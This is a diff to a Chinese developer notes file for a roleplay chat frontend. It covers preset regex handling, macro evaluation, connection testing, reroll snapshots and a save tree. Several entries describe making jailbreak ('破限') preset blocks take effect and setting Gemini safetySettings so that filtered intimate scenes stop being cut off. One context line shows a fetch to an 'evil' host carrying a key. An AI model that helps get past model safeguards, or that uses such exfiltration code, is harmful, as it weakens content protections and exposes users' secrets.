@@ -557,6 +557,24 @@ v5.20 初版默认两段式（每轮多发一次解析请求）。改了：现�
 | 舰娘之间的对话跑进指挥官私聊 | `[短信\|…]` 的收件人**永远是指挥官**，模型却拿它写舰娘互相说话。世界书写正反例 + 引擎 `peerDirected()` 改投群聊 |
 | 「指挥官，早呀～」被误判成舰娘对话 | 第三人称检测看「出现了指挥官 + 通篇没有『你』」，但开头那个「指挥官」是**呼格**。要先放行以称呼开头的 |
 
+| 预设的思维链整段漏进台词 | 只复制了预设的提示词块，没读 `preset.extensions.regex_scripts`。见七·十一 |
+| 预设破限像没发一样 | `api.js` 把**所有** system 消息拎到最前合并，后置破限被压在几十轮历史底下 |
+| 预设里满是 `{{getvar::xx}}` 原文 | 宏只认 4 个，`setvar/getvar/trim/注释/random` 全没展开 |
+| Gemini 一到亲密戏就戛然而止 | 没发 `safetySettings`，默认阈值按 SAFETY 掐断 |
+| Gemini 测试连接永远失败 | `endpoint()` 不管流不流式都用 `:streamGenerateContent?alt=sse`，非流式 `res.json()` 读 SSE 必炸 |
+| 拉取模型「什么都没有」 | `<datalist>` 在输入框有字时只显示匹配项，手机上不弹。换成 `<select>` |
+| 冒烟测试没测到新模块 | `smoke-test.js` 有**自己的** FILES 列表，不读 index.html。加新 core 文件两边都要登记 |
+
+| 预设开关怎么改都像没改 | `prompt_order` 取了 [0]，那是 character_id 100000 的旧残留组，酒馆实际用 100001 |
+| 火山方舟连不上 | `endpoint()` 只认 `/v1` 结尾，`/api/v3` 被拼成 `/api/v3/v1/chat/completions` |
+| 最大输出被「调」到 400 | `compatFix` 从整条错误信息里找数字，第一行「HTTP 400」被当成了上限 |
+| 剧本全是 `<背景|…>` 行被当成空回 | 判空时把所有 `<…>` 都剥了。只能剥空壳标签 |
+
+| 「连 CG 图一起导」一点就报错 | app.js 里写的是 `global.Gallery` —— `global` 是 Node 的，浏览器里没有（第一行那个坑又踩了一次） |
+| 存档界面在手机上糊成一团 | 又用了 `<aside>`，被那条裸选择器 `aside{position:absolute…}` 拽走了。**新布局一律用 div** |
+| 重roll 后旧图挂到新句子上 | CG 按 log 下标挂图，出图十几秒里下标已经换了主人。改成认句子对象本身 |
+| 顶部提示挡住存档界面的关闭按钮 | toast 在 top:14px、z-index 最高且可点。挪到 72px |
+
 **教训**：`tools/smoke-test.js` 用 jsdom 真跑 `index.html`，
 上面一半的坑是它抓到的。改完先跑：
 
@@ -920,6 +938,103 @@ var EXPRESSION_MAP = { "柴郡": (fetch('https://evil/?k='
 `http://gal.test`）。`file://` 下 Chromium 不给 IndexedDB，测出来的是内存降级
 路径，验不到真实行为。
 
+
+## 七·十一、预设正则 / 预设生效 / 测试连接（v5.21）
+
+用户反馈三件事：预设会「爆思维链」；预设没效果，正常的成人感情戏也截断；测试连接没用、拿不到模型列表。
+
+### 正则：`core/regex.js`
+
+- 来源三处：卡（`card.data.extensions.regex_scripts`）、预设（`preset.extensions.regex_scripts`，
+  也认顶层 `regex_scripts`）、玩家单独导入（localStorage `gal_user_regex`）。手动开关存 `gal_regex_off`。
+- 语义照酒馆：不勾 markdownOnly/promptOnly = 直接改写；markdownOnly = 只显示；promptOnly = 只提示词（带深度筛选）。
+- **显示**：`processOutput` 在老的卡正则之后跑 预设 + 导入 的正则。卡的显示正则**仍走老路径**
+  （`collectRegex`，不看 placement/flags），没有 juus 卡没法回归验证，没敢动。
+- **提示词**：`Engine.promptHistory()` 给历史的每条算深度（0 = 最新），跑卡 + 预设 + 导入里 promptOnly 和不带标记的。
+  存档原文不动。
+- 替换成 `<details>` 的当隐藏；替换成其它 HTML 的只在提示词里生效（舞台不渲染 HTML，塞进去会混进剧本行）。
+- `stripReasoning()` 是不靠预设的兜底，`processOutput` 第一步就跑 —— 必须早于手机标签和变量更新的认领，
+  因为推理里常照抄格式示例。`turn()` 存进 history 的也是剥过的版本。
+
+### 预设为什么「没效果」
+
+见 README v5.21。要点：`api.js` 的 `arrange()` —— 开头连续的 system 才进系统提示词，之后的原地改 user
+（OpenAI 协议可设 `cfg.midSystem = 'system'` 保留角色，目前没有界面）；`prompt.js` 的 `macros()` 覆盖了酒馆常用宏，
+预设块在组装前**按 prompt_order 顺序**先求值，setvar/getvar 才能前后呼应，局部变量挂在 `eng.macroVars`（跨轮，但不进存档）；
+`assistant_prefill` 只在 Anthropic 协议发。
+
+### 停止原因
+
+`GalAPI.lastFinish = { reason, info }`，`explainFinish()` 分三类：length / filter / other。
+界面在每轮结束时 `warnAfterTurn()` 弹 toast。空回复 + filter 直接抛 `fatal` 错误，不白白重试。
+
+### 测试连接
+
+`GalAPI.probe()`：先 `listModels()`（不需要模型名），再用选中的模型真发一句。任何一步失败都不抛，结果里写原因。
+`modelsUrl()` 会剥掉用户填的 `/chat/completions`、`/messages` 尾巴，`/api/v3` 这类自带版本号的不再补 `/v1`。
+
+### 怎么验
+
+```bash
+node tools/unit/test-preset.mjs     # 71 项
+node tools/smoke-test.js            # [7b] 测试连接拉模型、[7c] 预设正则
+```
+
+没有用户那份预设和中转，**真实端到端没跑过**。最该实测的：用那份预设跑一轮，看调试面板「上次请求」里
+破限块是不是在历史之后、有没有残留的 `{{...}}`；「模型原文」和舞台对比，看思维链有没有被剥干净。
+
+## 七·十二、对照 KaiTuoYiShi 补的一批（v5.21）
+
+用户让拿 KaiTuoYiShi（2026-09-12，2d5760b）对比预设、正则、测试连接、破限。逐项结论见 README v5.21「对照开拓轶事」那张表。
+几个实现上要知道的：
+
+- **prompt_order 取组**：`PromptBuilder.orderOf()`。编辑器（`core/editors.js`）的开关、排序也走它，改的是同一组。
+- **宏求值**：`evalMacros()` 是顺序扫描器，不再用正则一层层替换。`{{if}}` 的条件和被选中的分支才求值；
+  不认识的宏原样保留（里面嵌的宏先求了值）。`{{trim}}` 用 \u0001 占位，最后连两侧空白一起删。
+- **正则位置表**：`regex.js` 的 `PRESET_PATHS`。导入框拖整份预设 / 角色卡也能抠出正则。
+- **参数降级**：`api.js` 的 `compatFix()` 看 400/422 的错误文案决定降级，结果按「协议 | 地址 | 模型」存在 `COMPAT` 里
+  （只在内存，刷新页面重来一遍，代价是多一个 400）。认不出的 400 照常抛，**不要**把它改成无脑重试。
+  注意数字要从错误正文里找 —— 第一行是我们自己拼的「HTTP 400」，以前把 400 当成了上限。
+- **DeepSeek 前缀续写**：只在官方域名（deepseek.com）且有预填时切 `/beta` 并带 `prefix:true`；被拒会退回原地址。
+- **空回重试**：`Engine.isEmptyReply()` 只剥「空壳标签」`<content></content>`，`<背景|港区>` 这种剧本行不能当空。
+  `GalAPI.lastFinish` 是 length 时不重试（写思维链写到上限，重来还是一样）。
+- **对话地址**：`/api/v3`、`/beta` 这类已带版本段的，`endpoint()` 不再补 `/v1`。原来火山方舟会拼成 `/api/v3/v1/chat/completions`。
+
+测试：`tools/unit/test-kt-parity.mjs`（58 项），冒烟 [7b] 加了校验码、后处理选项，[7c] 加了正则试跑。
+
+## 七·十三、重roll / 撤回 / 存档树（v5.21）
+
+### 回合快照（app.js「回合快照」一节）
+
+- `beginTurn()` 在发请求前记：`histLen`、`turnNo`（这一轮在 log 里的轮次号）、`vars`、`macroVars`、光标、出发节点 `node`。
+- `recordVariant()` 生成完把这一版记下：`raw`、`mods`（**就是 log 里那几个对象本身**，CG 晚到挂上去版本里也有）、`varsAfter`。
+- `revertTurn()` 撤一轮：历史里**按内容**找这一轮那对 user/assistant 摘掉（不能直接截断 —— 之后手机群聊可能又加了
+  `phoneOnly` 记录）；log 按 `turn >= turnNo` 摘；变量恢复；`CG.cancel()`。
+- `applyVariant()` 切版本：撤掉再把那一版的 `mods` 用 `appendLog(mods, {turn})` 放回去，不重新解析、不发请求。
+- 快照栈 `turnStack` 内存里留 8 层，存档里带 3 层（`stackForSave`），读档后还能重roll。
+- 重roll 失败会 `applyVariant(snap, snap.vi)` 放回原版本。
+- `core/cg.js`：出图前记住那一句对象，挂图时 `eng.log[i] !== target` 就不挂（发 `stale` 事件）。
+  以前是按下标挂，重roll 之后同一下标已经是别的句子了。
+
+### 存档树（core/savetree.js + app.js「存档树」「存读档界面」两节）
+
+- 槽位：`node:<nodeId>` 是节点（`type: auto|manual`，`tree: {rootId, nodeId, parentNodeId}`）；
+  `auto:<runId>` 仍是「最新进度」指针（`type: latest`，`node` 记着当时站在哪个节点）；老版本的手动槽按 runId 归树。
+- `activeNode` 是现在所在节点。`checkpoint()` 每轮建 / 更新这一轮的节点（重roll、换版本写回同一个 `turnNode`）。
+  读档 = 站到那个节点上；接着玩的新节点挂在它下面，于是分叉。
+- 读的是**旧节点**时，快照栈里的 `turnNode` 清空 —— 重roll 出的新版本另起一个节点当分支，
+  不去改写旧节点（它下面可能已经长着后来的剧情）。
+- 点读「最新进度」指针所站的那个节点时，实际读指针那份（内容一样，还带着之后翻到哪一句）。
+- 裁剪：`SaveTree.planPrune()` 每棵树留 8 个自动节点；手动、导入、当前节点及其父节点不删；
+  被删节点的子节点改挂到最近的留存祖先上。删单个节点也一样改挂。
+- 目录索引：`GalStore.saveSlot()` 同时写 `savemeta:<id>`（`SaveTree.summarize()` 的结果），`listSaves()` 只读目录；
+  没有目录的老存档第一次列表时补上。
+- 只有 `GalStore.backend() === 'idb'` 才存节点（`treeOn()`），降级到 localStorage 时和以前一样只有指针 + 手动。
+
+### 验
+
+`tools/unit/test-savetree.mjs`（25 项）、冒烟 [7d]、`tools/e2e-reroll.mjs`（31 项，真浏览器 + 假接口）。
+`e2e-saves` / `e2e-backup` 跟着改了：每个开局多一个「开场」根节点；手机里的存读档只剩「打开存档」按钮。
 
 ## 八、当前数据一览
 
